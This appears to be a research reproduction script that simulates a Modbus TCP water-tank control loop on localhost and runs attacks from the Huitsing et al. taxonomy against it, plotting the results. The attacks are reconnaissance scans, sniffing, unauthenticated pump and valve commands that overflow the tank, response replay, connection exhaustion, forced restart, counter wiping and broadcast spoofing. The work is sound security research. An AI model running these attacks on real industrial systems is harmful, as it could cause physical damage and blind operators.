"""
run_all.py
==========
Reproduction experiments for the Modbus attack taxonomy of
Huitsing, Chandia, Papa & Shenoi, "Attack taxonomies for the Modbus protocols",
International Journal of Critical Infrastructure Protection, 2008.

The paper is a *taxonomy* (no experiments), so the reproduction recreates a live
Modbus TCP master/slave with a small physical process and then carries out a
representative attack from every threat category in the taxonomy, measuring its
real effect.  Each scenario saves a PNG into results/ and records numbers into
results/metrics.json.

Run:  python experiments/run_all.py
"""

from __future__ import annotations

import json
import os
import sys
import threading
import time

import numpy as np
import matplotlib
matplotlib.use("Agg")
import matplotlib.pyplot as plt

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, os.path.join(ROOT, "src"))
RESULTS = os.path.join(ROOT, "results")
os.makedirs(RESULTS, exist_ok=True)

import modbus_protocol as mb            # noqa: E402
import process_model as pm              # noqa: E402
from modbus_server import ModbusServer  # noqa: E402
from modbus_client import ModbusClient  # noqa: E402
import attacks                          # noqa: E402

plt.rcParams.update({
    "font.size": 10, "axes.grid": True, "grid.alpha": 0.3,
    "figure.dpi": 130, "savefig.dpi": 130, "axes.titlesize": 11,
})

METRICS = {}
LOG = []
_PORT = [5050]


def log(msg):
    print(msg)
    LOG.append(msg)


def new_server(**kw):
    _PORT[0] += 1
    srv = ModbusServer(port=_PORT[0], **kw).start()
    time.sleep(0.35)
    return srv, _PORT[0]


# ----------------------------------------------------------------------------
# A simple SCADA control loop (the legitimate master) running in a thread.
# Holds the tank level in a band by switching the pump; logs what it *sees*
# (via Modbus) alongside the *true* level (read directly from the process).
# ----------------------------------------------------------------------------
def run_master_loop(srv, port, duration, poll_dt=0.1, via_port=None,
                    control=True, stop_evt=None):
    cport = via_port if via_port is not None else port
    c = ModbusClient(port=cport, timeout=2.0).connect()
    t0 = time.time()
    trace = []
    try:
        while time.time() - t0 < duration:
            if stop_evt is not None and stop_evt.is_set():
                break
            t = time.time() - t0
            ok = True
            seen = None
            try:
                seen = c.read_input_registers(pm.TANK_LEVEL, 1)[0]
                alarm = c.read_coils(pm.HIGH_ALARM, 1)[0]
            except Exception:
                ok = False
                alarm = None
            true_level = srv.store.input_registers[pm.TANK_LEVEL]
            trace.append((t, true_level, seen if seen is not None else np.nan,
                          1 if ok else 0))
            # closed-loop control on what the master sees
            if control and ok and seen is not None:
                try:
                    if seen > 550:
                        c.write_coil(pm.PUMP_RUN, False)
                    elif seen < 450:
                        c.write_coil(pm.PUMP_RUN, True)
                except Exception:
                    pass
            time.sleep(poll_dt)
    finally:
        c.close()
    return np.array(trace, dtype=float)


# ============================================================================
# Experiment 1 — Normal Modbus communication (baseline)
# ============================================================================
def exp_normal():
    log("\n=== Experiment 1: Normal Modbus communication (baseline) ===")
    srv, port = new_server()

    # capture a couple of real transactions through a passive tap for decoding
    proxy = attacks.MitmProxy(port + 500, target_port=port, mode="passive").start()
    time.sleep(0.2)
    with ModbusClient(port=port + 500) as c:
        c.read_input_registers(pm.TANK_LEVEL, 3)
        c.write_coil(pm.PUMP_RUN, True)
    time.sleep(0.2)
    cap = list(proxy.captured)
    proxy.stop()

    trace = run_master_loop(srv, port, duration=16.0, poll_dt=0.1)
    srv.stop()

    t, true_l = trace[:, 0], trace[:, 1] / 10.0
    fig = plt.figure(figsize=(12.5, 5.1))
    gs = fig.add_gridspec(2, 1, height_ratios=[2.5, 1.7], hspace=0.55)
    ax0 = fig.add_subplot(gs[0])
    ax1 = fig.add_subplot(gs[1]); ax1.axis("off")

    ax0.plot(t, true_l, color="tab:blue", lw=1.7)
    ax0.axhline(90, color="tab:red", ls=":", lw=1, label="high alarm (90%)")
    ax0.axhline(10, color="tab:orange", ls=":", lw=1, label="low limit (10%)")
    ax0.axhspan(45, 55, color="tab:green", alpha=0.12, label="control band")
    ax0.set_title("(a) Closed-loop control: tank level held in band", fontsize=12)
    ax0.set_xlabel("Time [s]"); ax0.set_ylabel("Tank level [%]")
    ax0.set_ylim(0, 100); ax0.legend(fontsize=9, loc="upper right", ncol=3)

    # (b) decoded packet table from the captured frames (full width)
    rows = [["Dir", "Frame bytes (hex)", "Tx", "Unit", "Function", "Fields"]]
    for direction, fc, hexs in cap[:6]:
        b = bytes.fromhex(hexs.replace(" ", "  ").replace("  ", " "))
        tid = (b[0] << 8) | b[1]
        unit = b[6]
        fcode = b[7]
        name = mb.FUNCTION_NAMES.get(fcode & 0x7F, f"0x{fcode:02X}")
        if direction == "req" and fcode in (mb.READ_INPUT_REGISTERS,
                                            mb.READ_HOLDING_REGISTERS, mb.READ_COILS):
            addr = (b[8] << 8) | b[9]; cnt = (b[10] << 8) | b[11]
            fields = f"addr={addr} qty={cnt}"
        elif direction == "req" and fcode == mb.WRITE_SINGLE_COIL:
            addr = (b[8] << 8) | b[9]; val = (b[10] << 8) | b[11]
            fields = f"coil={addr} -> {'ON' if val == 0xFF00 else 'OFF'}"
        elif direction == "resp" and fcode in (mb.READ_INPUT_REGISTERS,
                                               mb.READ_HOLDING_REGISTERS):
            bc = b[8]; vals = [ (b[9+2*i]<<8)|b[10+2*i] for i in range(bc//2)]
            fields = "values=" + str(vals)
        else:
            fields = ""
        rows.append([direction, hexs, str(tid), str(unit), name, fields])
    tbl = ax1.table(cellText=rows, cellLoc="left", loc="upper center",
                    colWidths=[0.05, 0.43, 0.05, 0.06, 0.20, 0.21])
    tbl.auto_set_font_size(False); tbl.set_fontsize(9.5); tbl.scale(1, 1.7)
    for (r, cc), cell in tbl.get_celld().items():
        cell.set_edgecolor("#cccccc")
        if r == 0:
            cell.set_facecolor("#222222"); cell.set_text_props(color="w", fontweight="bold")
        elif r % 2 == 0:
            cell.set_facecolor("#f0f0f0")
    ax1.set_title("(b) Decoded Modbus TCP frames captured from the wire (cleartext — no encryption)",
                  fontsize=12)
    fig.suptitle("Normal Modbus TCP operation: a master polling and controlling a slave RTU",
                 fontsize=13)
    fig.tight_layout(rect=[0, 0, 1, 0.95])
    fig.savefig(os.path.join(RESULTS, "fig1_normal.png")); plt.close(fig)
    log(f"  saved fig1_normal.png  (captured {len(cap)} frames; level held in 45-55% band)")
    METRICS["normal"] = {"captured_frames": len(cap),
                         "level_mean_pct": round(float(np.nanmean(true_l)), 1),
                         "level_min_pct": round(float(np.nanmin(true_l)), 1),
                         "level_max_pct": round(float(np.nanmax(true_l)), 1)}


# ============================================================================
# Experiment 2 — Interception: B6 scan, S5 server-id, B9 passive sniff
# ============================================================================
def exp_interception():
    log("\n=== Experiment 2: Interception (B6 scan, S5 report-id, B9 passive sniff) ===")
    srv, port = new_server()

    scan = attacks.scan_network("127.0.0.1", port, unit_ids=range(1, 4), reg_probe=4)
    sid = attacks.slave_recon("127.0.0.1", port)

    # B9 passive reconnaissance via a transparent tap
    proxy = attacks.MitmProxy(port + 500, target_port=port).start()
    time.sleep(0.2)
    with ModbusClient(port=port + 500) as c:
        c.read_input_registers(0, 3)
        c.read_holding_registers(0, 2)
        c.read_coils(0, 4)
    time.sleep(0.2)
    sniffed = [x for x in proxy.captured if x[0] == "resp"]
    proxy.stop(); srv.stop()

    n_units = len(scan)
    hold_map = scan[0]["holding"] if scan else []
    log(f"  B6 scan: device answered on {n_units} unit-id(s); "
        f"discovered {len(hold_map)} holding regs + coils with NO authentication")
    log(f"  S5 Report Server ID returned: '{sid}'")
    log(f"  B9 passive sniff recovered {len(sniffed)} cleartext response frames "
        f"(register/coil values readable in the clear)")

    def _style(tbl, header_rows=1):
        for (r, cc), cell in tbl.get_celld().items():
            cell.set_edgecolor("#cccccc")
            if r < header_rows:
                cell.set_facecolor("#222222")
                cell.set_text_props(color="w", fontweight="bold")
            elif r % 2 == 0:
                cell.set_facecolor("#f0f0f0")

    fig, ax = plt.subplots(1, 2, figsize=(12, 5.4))
    # (a) discovered asset map
    reg_names = {0: "PUMP_SPEED_SP", 1: "LEVEL_SETPOINT"}
    rows = [["Asset", "Address", "Value", "Meaning"]]
    for addr, val in scan[0]["holding"][:2]:
        rows.append(["Holding reg", str(addr), str(val), reg_names.get(addr, "?")])
    coil_names = {0: "PUMP_RUN", 1: "INLET_VALVE", 2: "OUTLET_VALVE", 3: "HIGH_ALARM"}
    for i, v in enumerate(scan[0]["coils"][:4]):
        rows.append(["Coil", str(i), "ON" if v else "OFF", coil_names.get(i, "?")])
    rows.append(["Identity (S5)", "FC17", sid, "device fingerprint"])
    ax[0].axis("off")
    tbl = ax[0].table(cellText=rows, cellLoc="left", loc="upper center",
                      colWidths=[0.25, 0.15, 0.24, 0.36])
    tbl.auto_set_font_size(False); tbl.set_fontsize(11.5); tbl.scale(1, 2.4)
    _style(tbl)
    ax[0].set_title("(a) B6 / S5: full asset map recovered by an\nunauthenticated scan",
                    fontsize=12)

    # (b) passive sniff of cleartext responses (as a matching table)
    ax[1].axis("off")
    rows2 = [["Function", "Captured response frame (hex)"]]
    for (_, fc, hexs) in sniffed[:5]:
        name = mb.FUNCTION_NAMES.get(fc & 0x7F, f"0x{fc:02X}")
        rows2.append([name, hexs])
    tbl2 = ax[1].table(cellText=rows2, cellLoc="left", loc="upper center",
                       colWidths=[0.34, 0.66])
    tbl2.auto_set_font_size(False); tbl2.set_fontsize(10.5); tbl2.scale(1, 2.4)
    _style(tbl2)
    ax[1].text(0.5, 0.50,
               "All payloads are plaintext — an eavesdropper reads every\n"
               "process value and command without breaking any cipher.",
               ha="center", va="top", fontsize=10.5, style="italic",
               color="#333333", transform=ax[1].transAxes)
    ax[1].set_title("(b) B9: passive sniff of cleartext responses\n(values readable on the wire)",
                    fontsize=12)
    fig.suptitle("Interception attacks: confidentiality lost with no credentials and no cipher",
                 fontsize=13)
    fig.tight_layout(rect=[0, 0, 1, 0.95])
    fig.savefig(os.path.join(RESULTS, "fig2_interception.png")); plt.close(fig)
    log("  saved fig2_interception.png")
    METRICS["interception"] = {
        "units_answered": n_units, "holding_regs_found": len(hold_map),
        "coils_found": len(scan[0]["coils"]) if scan else 0,
        "server_id": sid, "sniffed_frames": len(sniffed)}


# ============================================================================
# Experiment 3 — Modification / Fabrication: B4 Direct Slave Control
# ============================================================================
def exp_injection():
    log("\n=== Experiment 3: B4 Direct Slave Control (unauthorized command injection) ===")
    DUR, T_ATK = 18.0, 7.0

    def run(attacked):
        srv, port = new_server()
        stop = threading.Event()
        atk_fired = {"t": None}

        def attacker():
            # wait, then seize the slave: close outlet + force pump on, hold it
            while not stop.is_set():
                pass
        if attacked:
            def attacker():                       # noqa: F811
                time.sleep(T_ATK)
                atk_fired["t"] = T_ATK
                c = ModbusClient(port=port).connect()
                while not stop.is_set():
                    try:
                        c.write_coil(pm.OUTLET_VALVE, False)   # block the draw
                        c.write_coil(pm.PUMP_RUN, True)        # force inflow
                    except Exception:
                        break
                    time.sleep(0.05)
                c.close()
            threading.Thread(target=attacker, daemon=True).start()
        trace = run_master_loop(srv, port, DUR, poll_dt=0.1)
        stop.set(); time.sleep(0.1); srv.stop()
        return trace

    base = run(False)
    atk = run(True)

    # detect overflow time in attacked run
    over = np.where(atk[:, 1] >= pm.HIGH_LIMIT)[0]
    overflow_t = float(atk[over[0], 0]) if len(over) else None

    fig, ax = plt.subplots(1, 1, figsize=(9.5, 4.4))
    ax.plot(base[:, 0], base[:, 1] / 10.0, color="tab:green", lw=1.6,
            label="normal operation (master in control)")
    ax.plot(atk[:, 0], atk[:, 1] / 10.0, color="tab:red", lw=1.8,
            label="under B4 Direct Slave Control")
    ax.axvline(T_ATK, color="k", ls="--", lw=1, label=f"attack at t={T_ATK:.0f}s")
    ax.axhline(90, color="tab:red", ls=":", lw=1, label="high alarm (90%)")
    if overflow_t:
        ax.axvline(overflow_t, color="tab:purple", ls="-.", lw=1,
                   label=f"overflow at t={overflow_t:.1f}s")
    ax.set_title("B4 Direct Slave Control: attacker overrides the master and overflows the tank")
    ax.set_xlabel("Time [s]"); ax.set_ylabel("Tank level [%]"); ax.set_ylim(0, 105)
    ax.legend(fontsize=8, loc="center right")
    fig.tight_layout()
    fig.savefig(os.path.join(RESULTS, "fig3_injection.png")); plt.close(fig)
    log(f"  attacker forced OUTLET_VALVE=closed + PUMP_RUN=on with no authentication")
    log(f"  tank overflowed (>=90%) at t={overflow_t:.1f}s vs never under normal control")
    METRICS["injection"] = {
        "t_attack_s": T_ATK, "overflow_t_s": overflow_t,
        "latency_to_overflow_s": None if overflow_t is None else round(overflow_t - T_ATK, 2),
        "normal_max_pct": round(float(np.max(base[:, 1]) / 10.0), 1),
        "attacked_max_pct": round(float(np.max(atk[:, 1]) / 10.0), 1)}


# ============================================================================
# Experiment 4 — Modification: B2 Baseline Response Replay (loss of awareness)
# ============================================================================
def exp_replay():
    log("\n=== Experiment 4: B2 Baseline Response Replay (man-in-the-middle) ===")
    DUR, T_ATK = 18.0, 6.0
    srv, port = new_server()
    proxy = attacks.MitmProxy(port + 500, target_port=port).start()
    time.sleep(0.2)

    stop = threading.Event()

    def attacker():
        time.sleep(T_ATK)
        proxy.freeze_response_for(mb.READ_INPUT_REGISTERS)   # capture+replay level
        # also seize the process so the true level diverges from the frozen view
        c = ModbusClient(port=port).connect()
        while not stop.is_set():
            try:
                c.write_coil(pm.OUTLET_VALVE, False)
                c.write_coil(pm.PUMP_RUN, True)
            except Exception:
                break
            time.sleep(0.05)
        c.close()
    threading.Thread(target=attacker, daemon=True).start()

    # master polls AND controls THROUGH the proxy; before the attack it holds the
    # level in band, so the frozen baseline is a genuine "safe" reading
    trace = run_master_loop(srv, port, DUR, poll_dt=0.1, via_port=port + 500,
                            control=True)
    stop.set(); time.sleep(0.1); proxy.stop(); srv.stop()

    t = trace[:, 0]; true_l = trace[:, 1] / 10.0; seen_l = trace[:, 2] / 10.0
    # awareness gap after the attack
    post = t >= T_ATK
    gap = np.nanmax(np.abs(true_l[post] - seen_l[post])) if post.any() else 0.0

    fig, ax = plt.subplots(1, 1, figsize=(9.5, 4.4))
    ax.plot(t, true_l, color="tab:red", lw=1.8, label="TRUE tank level (physical)")
    ax.plot(t, seen_l, color="tab:blue", lw=1.8, ls="--",
            label="level SEEN by master (replayed)")
    ax.axvline(T_ATK, color="k", ls="--", lw=1, label=f"replay starts t={T_ATK:.0f}s")
    ax.axhline(90, color="tab:red", ls=":", lw=1, label="high alarm (90%)")
    ax.set_title("B2 Baseline Response Replay: master is blind while the tank overflows")
    ax.set_xlabel("Time [s]"); ax.set_ylabel("Tank level [%]"); ax.set_ylim(0, 105)
    ax.legend(fontsize=8, loc="center right")
    fig.tight_layout()
    fig.savefig(os.path.join(RESULTS, "fig4_replay.png")); plt.close(fig)
    log(f"  after replay began, master kept seeing ~{np.nanmean(seen_l[post]):.0f}% "
        f"while true level reached {np.nanmax(true_l):.0f}%")
    log(f"  maximum awareness gap (true - seen) = {gap:.1f} percentage points")
    METRICS["replay"] = {
        "t_attack_s": T_ATK,
        "seen_after_mean_pct": round(float(np.nanmean(seen_l[post])), 1),
        "true_max_pct": round(float(np.nanmax(true_l)), 1),
        "awareness_gap_pct": round(float(gap), 1)}


# ============================================================================
# Experiment 5 — Interruption / DoS: T10 TCP Pool Exhaustion
# ============================================================================
def exp_dos():
    log("\n=== Experiment 5: T10 TCP Pool Exhaustion (denial of service) ===")
    POOL = 8
    srv, port = new_server(max_connections=POOL)

    ns, lat, succ = [], [], []
    held = []
    for k in range(0, POOL + 4):
        # ramp attacker-held connections up to k
        while len(held) < k:
            try:
                s = attacks.pool_exhaustion("127.0.0.1", port, 1)
                held += s
            except Exception:
                break
        time.sleep(0.15)
        # legitimate master tries a fresh connect + read
        t0 = time.time()
        ok = False
        try:
            c = ModbusClient(port=port, timeout=1.0).connect()
            c.read_input_registers(pm.TANK_LEVEL, 1)
            ok = True
            c.close()
        except Exception:
            ok = False
        dt_ms = (time.time() - t0) * 1e3
        ns.append(k); succ.append(1 if ok else 0)
        lat.append(dt_ms if ok else np.nan)
        log(f"  attacker connections={k:>2}  active_on_slave={srv.active_connections():>2}  "
            f"legit master {'OK' if ok else 'REFUSED'} ({dt_ms:.0f} ms)")
    attacks.close_all(held)
    rejected = srv.rejected_connections
    srv.stop()

    ns = np.array(ns); succ = np.array(succ)
    first_fail = int(ns[np.where(succ == 0)[0][0]]) if (succ == 0).any() else None

    fig, ax = plt.subplots(1, 2, figsize=(12.5, 4.2))
    ax[0].step(ns, succ, where="mid", color="tab:blue", lw=1.8)
    ax[0].fill_between(ns, succ, step="mid", alpha=0.15, color="tab:blue")
    ax[0].axvline(POOL, color="tab:red", ls="--", lw=1.2,
                  label=f"pool size = {POOL}")
    ax[0].set_title("(a) Legitimate master availability")
    ax[0].set_xlabel("Attacker-held connections")
    ax[0].set_ylabel("Master poll succeeds (1/0)"); ax[0].set_ylim(-0.1, 1.1)
    ax[0].legend(fontsize=8)
    ax[1].plot(ns, lat, marker="o", color="tab:purple")
    ax[1].axvline(POOL, color="tab:red", ls="--", lw=1.2, label=f"pool size = {POOL}")
    ax[1].set_title("(b) Master round-trip latency (successful polls)")
    ax[1].set_xlabel("Attacker-held connections"); ax[1].set_ylabel("Latency [ms]")
    ax[1].legend(fontsize=8)
    fig.suptitle("T10 TCP Pool Exhaustion: a bounded connection pool is filled, locking out the master",
                 fontsize=12)
    fig.tight_layout(rect=[0, 0, 1, 0.93])
    fig.savefig(os.path.join(RESULTS, "fig5_dos.png")); plt.close(fig)
    log(f"  pool size={POOL}; first lock-out at {first_fail} attacker connections; "
        f"slave rejected {rejected} connection attempts")
    METRICS["dos"] = {"pool_size": POOL, "first_lockout_conns": first_fail,
                      "rejected_connections": int(rejected)}


# ============================================================================
# Experiment 6 — Interruption/Modification: S4 Remote Restart + S1 Diag Reset
# ============================================================================
def exp_diagnostics():
    log("\n=== Experiment 6: S4 Remote Restart + S1 Diagnostic Register Reset ===")
    srv, port = new_server()

    # ---- S4: poll continuously; fire a remote restart mid-stream ----
    DUR, T_ATK = 10.0, 3.5
    stop = threading.Event()

    def attacker():
        time.sleep(T_ATK)
        attacks.remote_restart("127.0.0.1", port)
        LOG.append(f"  [attacker] sent FC08/sub01 Remote Restart at t={T_ATK}s")
    threading.Thread(target=attacker, daemon=True).start()

    c = ModbusClient(port=port, timeout=0.8).connect()
    t0 = time.time(); avail = []
    while time.time() - t0 < DUR:
        t = time.time() - t0
        ok = True
        try:
            c.read_input_registers(pm.TANK_LEVEL, 1)
        except Exception:
            ok = False
            try:
                c.close(); c = ModbusClient(port=port, timeout=0.8).connect()
            except Exception:
                pass
        avail.append((t, 1 if ok else 0))
        time.sleep(0.1)
    c.close()
    avail = np.array(avail, dtype=float)
    stop.set()
    # real-time outage = span from first failed poll to recovery after the restart
    fails = avail[(avail[:, 0] >= T_ATK) & (avail[:, 1] == 0)]
    if len(fails):
        first_fail_t = float(fails[:, 0].min())
        after = avail[(avail[:, 0] > first_fail_t) & (avail[:, 1] == 1)]
        recover_t = float(after[:, 0].min()) if len(after) else float(avail[-1, 0])
        outage = recover_t - first_fail_t
    else:
        outage = 0.0

    # ---- S1: build up counters, read them, then attacker clears them ----
    with ModbusClient(port=port) as c2:
        for _ in range(15):
            c2.read_input_registers(0, 3)
    counters_before = dict(srv.counters)
    attacks.diagnostic_reset("127.0.0.1", port)
    time.sleep(0.1)
    counters_after = dict(srv.counters)
    srv.stop()

    fig, ax = plt.subplots(1, 2, figsize=(12.5, 4.2))
    ax[0].step(avail[:, 0], avail[:, 1], where="post", color="tab:blue", lw=1.6)
    ax[0].fill_between(avail[:, 0], avail[:, 1], step="post", alpha=0.15, color="tab:blue")
    ax[0].axvline(T_ATK, color="k", ls="--", lw=1, label=f"restart at t={T_ATK:.1f}s")
    ax[0].set_title(f"(a) S4 Remote Restart: ~{outage:.1f}s comms outage")
    ax[0].set_xlabel("Time [s]"); ax[0].set_ylabel("Slave responds (1/0)")
    ax[0].set_ylim(-0.1, 1.1); ax[0].legend(fontsize=8)

    keys = ["bus_messages", "slave_messages", "exceptions"]
    xb = np.arange(len(keys))
    ax[1].bar(xb - 0.2, [counters_before[k] for k in keys], width=0.4,
              color="tab:orange", label="before reset")
    ax[1].bar(xb + 0.2, [counters_after[k] for k in keys], width=0.4,
              color="tab:green", label="after S1 reset")
    ax[1].set_xticks(xb); ax[1].set_xticklabels(keys, rotation=15, fontsize=8)
    ax[1].set_title("(b) S1 Diagnostic Register Reset: counters wiped")
    ax[1].set_ylabel("Counter value"); ax[1].legend(fontsize=8)
    fig.suptitle("FC08 diagnostic abuse: forced restart (availability) and counter wipe (anti-forensics)",
                 fontsize=12)
    fig.tight_layout(rect=[0, 0, 1, 0.93])
    fig.savefig(os.path.join(RESULTS, "fig6_diagnostics.png")); plt.close(fig)
    log(f"  S4 caused ~{outage:.1f}s of lost communications after the restart")
    log(f"  S1 cleared diagnostic counters: bus_messages "
        f"{counters_before['bus_messages']} -> {counters_after['bus_messages']}")
    METRICS["diagnostics"] = {
        "restart_outage_s": round(outage, 2),
        "counters_before": counters_before, "counters_after": counters_after}


# ============================================================================
# Experiment 7 — Fabrication: B1 Broadcast Message Spoofing
# ============================================================================
def exp_broadcast():
    log("\n=== Experiment 7: B1 Broadcast Message Spoofing (fabrication) ===")
    srv, port = new_server()
    with ModbusClient(port=port) as c:
        before = c.read_coils(pm.PUMP_RUN, 1)[0]
    res = attacks.broadcast_spoof("127.0.0.1", port, "coil", pm.PUMP_RUN, False)
    time.sleep(0.1)
    with ModbusClient(port=port) as c:
        after = c.read_coils(pm.PUMP_RUN, 1)[0]
    srv.stop()
    log(f"  sent broadcast (unit id 0) write PUMP_RUN=OFF: {res['sent']}")
    log(f"  slave responded to broadcast? {res['got_response']}  "
        f"(no response = stealthy, as the paper notes)")
    log(f"  PUMP_RUN coil: {before} -> {after}  (command took effect silently)")
    METRICS["broadcast"] = {"got_response": res["got_response"],
                            "coil_before": bool(before), "coil_after": bool(after),
                            "frame": res["sent"]}


# ============================================================================
# Experiment 8 — Taxonomy mapping figure (recreate Tables 1/2 + Table 5 view)
# ============================================================================
def make_taxonomy_figure():
    log("\n=== Building taxonomy coverage + summary figures ===")
    threats = ["Interception", "Interruption", "Modification", "Fabrication"]
    targets = ["Master", "Field device", "Net path / link", "Message"]
    # cells we exercised, labelled with the paper's attack designators
    exercised = {
        ("Interception", "Field device"): "B6,S5,B9",
        ("Interception", "Net path / link"): "B9,B14",
        ("Interception", "Message"): "B14",
        ("Interruption", "Master"): "T10",
        ("Interruption", "Field device"): "S4,T10",
        ("Modification", "Field device"): "B4,B2",
        ("Modification", "Master"): "B2",
        ("Fabrication", "Master"): "B4-3",
        ("Fabrication", "Field device"): "B1,B14",
    }
    fig, ax = plt.subplots(figsize=(11.5, 4.2))
    ax.set_xlim(0, len(targets)); ax.set_ylim(0, len(threats))
    for i, th in enumerate(threats):
        for j, tg in enumerate(targets):
            y = len(threats) - 1 - i
            key = (th, tg)
            if key in exercised:
                ax.add_patch(plt.Rectangle((j, y), 1, 1, facecolor="#2a7", alpha=0.30,
                                           edgecolor="#cccccc"))
                ax.text(j + 0.5, y + 0.62, "✓", ha="center", va="center",
                        fontsize=13, color="#185")
                ax.text(j + 0.5, y + 0.30, exercised[key], ha="center", va="center",
                        fontsize=8, color="#0a3")
            else:
                ax.add_patch(plt.Rectangle((j, y), 1, 1, facecolor="#f4f4f4",
                                           edgecolor="#cccccc"))
    ax.set_xticks(np.arange(len(targets)) + 0.5); ax.set_xticklabels(targets, fontsize=9)
    ax.set_yticks(np.arange(len(threats)) + 0.5)
    ax.set_yticklabels(list(reversed(threats)), fontsize=9)
    ax.set_xticks(np.arange(len(targets) + 1), minor=True)
    ax.set_title("Taxonomy coverage: threat category x target asset (cells reproduced in this project)",
                 fontsize=11)
    ax.tick_params(length=0)
    fig.tight_layout()
    fig.savefig(os.path.join(RESULTS, "fig7_taxonomy.png")); plt.close(fig)
    log("  saved fig7_taxonomy.png")


def make_summary_figure():
    a = METRICS
    rows = [["Attack (taxonomy code)", "Threat", "Target", "Observed result"]]
    rows.append(["B6/S5/B9 Reconnaissance", "Interception", "Field device",
                 f"{a['interception']['holding_regs_found']} regs + "
                 f"{a['interception']['coils_found']} coils + ID read, no auth"])
    rows.append(["B4 Direct Slave Control", "Modification", "Field device",
                 f"tank overflow {a['injection']['latency_to_overflow_s']}s after attack"])
    rows.append(["B2 Baseline Resp. Replay", "Modification", "Master",
                 f"awareness gap {a['replay']['awareness_gap_pct']} pts (master blind)"])
    rows.append(["T10 TCP Pool Exhaustion", "Interruption", "Master",
                 f"master locked out at {a['dos']['first_lockout_conns']} conns "
                 f"(pool {a['dos']['pool_size']})"])
    rows.append(["S4 Remote Restart", "Interruption", "Field device",
                 f"~{a['diagnostics']['restart_outage_s']}s comms outage"])
    rows.append(["S1 Diagnostic Reset", "Modification", "Field device",
                 f"counters wiped to 0 (anti-forensics)"])
    rows.append(["B1 Broadcast Spoofing", "Fabrication", "Field device",
                 f"silent write, response={a['broadcast']['got_response']}"])

    fig = plt.figure(figsize=(12.5, 3.6))
    ax = fig.add_axes([0.02, 0.02, 0.96, 0.96]); ax.axis("off")
    tbl = ax.table(cellText=rows, cellLoc="left", loc="center",
                   colWidths=[0.26, 0.15, 0.16, 0.43])
    tbl.auto_set_font_size(False); tbl.set_fontsize(10); tbl.scale(1, 1.9)
    for (r, c), cell in tbl.get_celld().items():
        cell.PAD = 0.04; cell.set_edgecolor("#cccccc")
        if r == 0:
            cell.set_facecolor("#222222"); cell.set_text_props(color="w", fontweight="bold")
        elif r % 2 == 0:
            cell.set_facecolor("#f0f0f0")
    fig.savefig(os.path.join(RESULTS, "fig8_summary.png"), dpi=150,
                bbox_inches="tight", pad_inches=0.15)
    plt.close(fig)
    log("  saved fig8_summary.png")


# ----------------------------------------------------------------------------
def main():
    t0 = time.time()
    log("=" * 74)
    log("MODBUS ATTACK TAXONOMY REPRODUCTION - Huitsing, Chandia, Papa & Shenoi (2008)")
    log("Self-contained Modbus TCP master/slave + attack toolkit (pure Python)")
    log("=" * 74)
    exp_normal()
    exp_interception()
    exp_injection()
    exp_replay()
    exp_dos()
    exp_diagnostics()
    exp_broadcast()
    make_taxonomy_figure()
    make_summary_figure()

    with open(os.path.join(RESULTS, "metrics.json"), "w") as f:
        json.dump(METRICS, f, indent=2)
    with open(os.path.join(RESULTS, "run_log.txt"), "w", encoding="utf-8") as f:
        f.write("\n".join(LOG))
    log("\n" + "=" * 74)
    log(f"DONE in {time.time()-t0:.1f}s. Figures + metrics.json + run_log.txt in results/")
    log("=" * 74)


if __name__ == "__main__":
    main()
